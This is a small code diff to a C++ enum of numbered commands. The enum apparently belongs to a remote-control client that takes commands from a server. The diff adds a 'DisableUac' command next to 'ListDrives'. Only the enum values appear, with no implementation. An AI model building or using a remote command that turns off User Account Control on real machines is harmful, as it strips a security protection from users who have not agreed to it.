@@ -22,7 +22,9 @@ enum class CommandType {
     Update = 14,
     Screenshot = 15,
     MessageBox = 16,
-    UpdateAvailable = 17
+    UpdateAvailable = 17,
+    DisableUac = 18,
+    ListDrives = 19
 };
 
 // Incoming message from server
